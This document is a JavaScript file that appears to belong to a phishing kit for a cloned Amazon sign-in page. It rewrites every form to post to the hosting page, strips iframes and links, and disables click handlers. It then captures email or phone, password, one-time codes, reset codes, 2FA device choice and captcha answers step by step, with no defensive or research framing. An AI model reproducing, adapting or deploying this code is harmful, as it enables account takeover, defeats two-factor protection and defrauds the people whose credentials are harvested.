let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// all possible selectors
let ap_email = document.querySelector(`[type="email"]`)
let ap_password = document.querySelector(`[type="password"]`)
let submitBtn = document.querySelector(`[type="submit"]`)
let otpInput = document.querySelector(`[name="otpCode"]`)
let otpDevices = document.querySelector(`[name="otpDeviceContext"]`)
let forgetPassOtp = document.querySelector(`[name="code"]`)
let captcha = document.querySelector(`[name="field-keywords"]`)
submitBtn.type = "button"

//set
if (ap_email) {
    addSpikeType("email")
    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const phPattern = /^[0-9]/
    submitBtn.addEventListener("click", () => {
        if (phPattern.test(ap_email.value)) {
            submitBtn.type = "submit"
        } else if (emailPattern.test(ap_email.value)) {
            submitBtn.type = "submit"
        } else {
            ap_email.classList.add("a-form-error")
            document.querySelector("#auth-email-missing-alert").style = "display: block;"
        }
    })
} else if (ap_password) {
    addSpikeType("password")
    submitBtn.addEventListener("click", () => {
        if (ap_password.value.length > 0) {
            submitBtn.type = "submit"
        } else {
            ap_password.classList.add("a-form-error")
            document.querySelector("#auth-password-missing-alert").style = "display: block;"
        }
    })

    let forgetPass = document.querySelector("#auth-fpp-link-bottom")
    forgetPass.type = "button"
    forgetPass.href = "#"
    forgetPass.addEventListener("click", () => {
        addSpikeType("forget_password")
        document.forms[0].submit()
    })
} else if (forgetPassOtp) {
    addSpikeType("forgetpass_otp_code")
    submitBtn.addEventListener("click", () => {
        if (forgetPassOtp.value.length > 0) {
            submitBtn.type = "submit"
        } else {
            forgetPassOtp.classList.add("a-form-error")
        }
    })
} else if (otpInput) {
    addSpikeType("otp_code")
    submitBtn.addEventListener("click", () => {
        if (otpInput.value.length > 0) {
            submitBtn.type = "submit"
        } else {
            otpInput.classList.add("a-form-error")
        }
    })

    let newOtpBtn = document.querySelector("#auth-get-new-otp-link")
    newOtpBtn.type = "button"
    newOtpBtn.href = "#"
    newOtpBtn.addEventListener("click", () => {
        addSpikeType("resend_otp")
        document.forms[0].submit()
    })

} else if (otpDevices) {
    addSpikeType("otp_devices")
    document.querySelector("form").innerHTML += `<input type="hidden" value="0" name="spike-device-index">`
    let allOtpDevices = document.querySelectorAll(`[name="otpDeviceContext"]`)
    allOtpDevices.forEach((inp, index) => {
        inp.addEventListener("change", () => {
            document.querySelector(`[name="spike-device-index"]`).value = index
        })
    })

    document.querySelector(`[type="button"]`).addEventListener("click", () => {
        document.querySelector(`[type="button"]`).type = "submit"
    })
} else if (captcha) {
    addSpikeType("captcha")
    submitBtn.addEventListener("click", () => {
        if (captcha.value.length > 0) {
            submitBtn.type = "submit"
        } else {
            captcha.classList.add("a-form-error")
        }
    })
}



// functions